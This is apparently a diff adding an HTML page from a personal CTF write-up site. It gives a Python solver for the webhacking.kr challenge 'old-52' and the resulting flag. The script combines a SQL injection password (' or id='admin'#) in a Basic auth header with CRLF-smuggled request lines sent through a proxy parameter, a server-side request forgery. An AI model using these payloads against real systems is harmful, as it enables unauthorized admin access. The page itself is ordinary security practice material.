@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>old-52 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="old-52" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/webhacking.kr/old-52.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/webhacking.kr/old-52.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="old-52" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"old-52","url":"http://localhost:4000/CTF_writeups/webhacking.kr/old-52.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="webhacking-old-52-solution">Webhacking old-52 Solution</h1>
+
+<p>in this challenge there is both server vulnerabilities and sql injection. the source code can be found here: [old-52]</p>
+<pre><code class="language-scripts/old-52.py">import requests
+import base64
+URL = "http://webhacking.kr:10008/proxy.php"
+SESSION_ID = "123"
+cookies = {'PHPSESSID':SESSION_ID}
+params = {'page':''}
+# username = 'guest'
+# password = 'guest'
+
+username = 'bla'
+password = "' or id='admin'#" # the sql injection part
+
+encoded_auth = base64.b64encode((username+':'+password).encode()).decode()
+
+payload = '''/admin/ HTTP/1.1\r\nCookie: PHPSESSID={}\r\nAuthorization: Basic {}\r\n'''.format(username, encoded_auth)
+
+params['page'] = payload
+
+response = requests.post(URL, params=params, cookies=cookies)
+print(response.text)
+</code></pre>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">FLAG{Server_Side_Request_Forgery_with_proxy!}</code></em></strong></p>
+
+      </section>
+    </div>
+  </body>
+</html>
